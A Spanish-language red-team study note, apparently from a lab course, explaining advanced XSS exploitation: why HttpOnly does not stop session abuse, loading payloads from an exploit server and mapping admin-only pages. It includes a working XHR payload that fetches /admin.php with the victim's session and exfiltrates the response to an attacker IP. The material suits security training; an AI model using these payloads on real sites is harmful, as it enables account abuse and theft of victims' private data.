---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-08
Nota previa:
Nota siguiente: "[[01 - Ataques desde la sesión de la víctima]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

El [[00 - Introducción a XSS|XSS básico]] se queda en robar cookies y desfigurar páginas. La explotación avanzada parte de otra idea: <mark style="background: #ADCCFFA6;">un XSS ejecuta JavaScript arbitrario **dentro de la sesión y el navegador de la víctima**, así que puede hacer cualquier cosa que la víctima pueda hacer</mark> — leer datos privados, ejecutar acciones privilegiadas y, combinado con [[01 - Fundamentos y defensas de CSRF|CSRF]], pivotar hacia la red interna. Este sub-tema desarrolla ese salto. Las primitivas (`XHR`/`Fetch`, servidor de exfiltración, OPSEC) son las de [[00 - Primitivas y entorno de explotación]].

# `HttpOnly`: frena el robo, no el abuso

La defensa estándar contra el robo de cookies es el flag `HttpOnly`: <mark style="background: #FFB8EBA6;">una cookie `HttpOnly` no es accesible desde `document.cookie`</mark>, así que el [[09 - Robo de sesión|cookie stealing]] clásico falla. En aplicaciones modernas la cookie de sesión casi siempre lo lleva.

Pero <mark style="background: #FF5582A6;">`HttpOnly` no reduce la gravedad de un XSS</mark>: aunque no puedas **leer** la cookie, el XSS sigue ejecutándose dentro de la sesión, y el navegador adjunta la cookie automáticamente a cada petición que tu payload lance. <mark style="background: #8000E1A6;">No necesitas robar la sesión para usarla</mark>: actúas como la víctima sin conocer su cookie. La diferencia es operativa — en vez de robar el token y usarlo desde tu navegador, escribes un payload que hace las acciones por ti en el navegador de ella.

# Exfiltrar datos en el contexto de la víctima

El patrón base de todo este sub-tema: inyectar un payload que carga el código desde el [[00 - Primitivas y entorno de explotación|exploit server]], lo que permite iterar el exploit sin reinyectar en la app vulnerable:

```html
<script src="https://exploitserver.htb/exploit"></script>
```

Y en el exploit server, un payload que hace una petición autenticada y exfiltra la respuesta base64 a nuestro servidor:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

<mark style="background: #FFB86CA6;">Como el `<script src>` se carga desde el exploit server, basta editar el código allí para cambiar el ataque</mark> — no hace falta volver a publicar una entrada en la app vulnerable; la víctima recarga el payload actualizado en cada visita.

# Descubrir funcionalidad solo-admin

La víctima suele tener más privilegios que nuestra cuenta. El primer paso es **mapear la app desde su punto de vista**: exfiltrar endpoints que ya conocemos (`/home.php`) pero renderizados con su sesión, comparando con lo que vemos nosotros. Un enlace a `/admin.php` en la navegación de la víctima que no aparece en la nuestra revela el panel de administración; exfiltrarlo destapa datos y funcionalidad que como usuarios sin privilegios no veríamos.

> [!important]+ El cambio de mentalidad
> El XSS deja de ser "una alerta que salta" para convertirse en un **agente remoto** dentro del navegador de la víctima. Todo lo que sigue —[[01 - Ataques desde la sesión de la víctima|account takeover]], [[02 - Enumeración de APIs internas|enumerar APIs internas]], [[03 - Pivote a aplicaciones internas|atacar apps internas]]— es consecuencia de esa idea: programas las acciones de la víctima en JavaScript y exfiltras lo que obtengas.

El primer abuso directo de ese control es tomar la cuenta de la víctima: [[01 - Ataques desde la sesión de la víctima]].
